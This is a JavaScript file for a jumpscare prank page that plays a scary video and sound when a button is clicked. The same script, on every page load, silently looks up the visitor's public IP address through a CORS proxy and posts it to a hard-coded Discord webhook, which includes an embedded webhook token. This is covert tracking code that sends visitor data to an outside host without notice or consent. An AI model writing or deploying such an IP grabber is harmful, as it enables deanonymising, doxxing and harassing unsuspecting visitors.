// script.js

// Function to send IP to Discord webhook
async function sendIPToDiscord() {
  try {
    // Use a proxy to bypass CORS restrictions
    const response = await fetch('https://cors-anywhere.herokuapp.com/https://api64.ipify.org/?format=json');
    const data = await response.json();

    const webhookUrl = 'https://discord.com/api/webhooks/1322340263817121872/KVz7ETrNyLzmHtpnWCWVNlcs7V688BSA59RFmammBBjnxFHk-kGj8bdQCGs3LpRPRzPE';
    const payload = {
      content: `IP Info: ${JSON.stringify(data)}`,
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.error('Failed to send IP info:', error);
  }
}

// Trigger the jumpscare on button click
document.getElementById('reload-button').addEventListener('click', () => {
  const jumpscare = document.getElementById('jumpscare');
  const video = document.getElementById('jumpscare-video');
  const audio = document.getElementById('jumpscare-audio');

  document.querySelector('.content').style.display = 'none';
  jumpscare.style.display = 'flex';
  
  video.play();
  audio.play().catch(error => console.error('Audio play failed:', error)); // Ensure audio starts
});

// Send IP info to Discord on page load
sendIPToDiscord();
